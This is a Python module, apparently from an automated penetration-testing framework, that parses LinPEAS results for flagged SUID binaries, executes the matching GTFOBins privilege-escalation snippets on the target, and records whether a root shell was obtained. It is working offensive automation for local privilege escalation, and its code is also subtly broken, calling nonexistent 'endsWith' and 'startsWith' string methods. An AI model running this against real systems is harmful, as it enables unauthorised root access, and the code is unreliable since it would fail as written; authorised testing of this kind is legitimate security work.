#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
from core.helper import get_gtfobins, get_linpeas_result
from core.constants import EX, INTERNAL
from core.module import Module

# https://gtfobins.github.io/


class GtfobinsModule(Module):
    _type = [EX]
    _services = []
    _target_type = INTERNAL
    _defaults = {}
    _extension = ".json"

    def run(self):
        suid_list = []
        result = {}

        # Import the linpeas as jsonfile and get relevent data
        data = self.linpeas_res['Interesting Files']['sections']["SUID - Check easy privesc, exploits and write perms"]["lines"]

        # Get the vulnerable binary from data based on color and split to get relevent info
        for index in range(len(data)):
            for keys, values in data[index]['colors'].items():
                if ((keys == 'RED') or (keys == 'REDYELLOW') or (keys == 'YELLOW')):
                    x = values[0].split('  ', 1)
                    suid_list.append(x[0])

        # Go through each result
        for program in suid_list:
            # Check SUID
            if program in self.gtfobins:
                if "SUID" in self.gtfobins[program]:
                    code = self.gtfobins[program]["SUID"]["code"]
                    code[-1] = f"echo 'whoami' | {code[-1]}"  # Get whoami after running last command, to see if root

                    (_, r) = self.run_cmd(" && ".join(code), use_sudo=False)

                    if program not in result:
                        result[program] = {}

                    # Create entry in result
                    if r.endsWith("root"):
                        # SUCCESS
                        result[program]["suid"] = "success"
                    else:
                        # FAILED, buuhuu
                        result[program]["suid"] = "failed"

                    # Remove temporary file
                    if code[0].startsWith("sudo install -m =xs"):
                        self.run_cmd(f"rm ./{program}")

        # Save result
        target_loc = f"{os.getcwd()}/targets/{self._target}/results"
        with open(f"{target_loc}/binsexploits_result.json", "w+") as f:
            f.write(json.dumps(result, indent=4))

    def parse(self):
        # Not needed
        pass

    def init(self):
        # Load result from linpeas
        self.linpeas_res = get_linpeas_result(self._target)

        # Load GTFOBINS
        self.gtfobins = get_gtfobins()
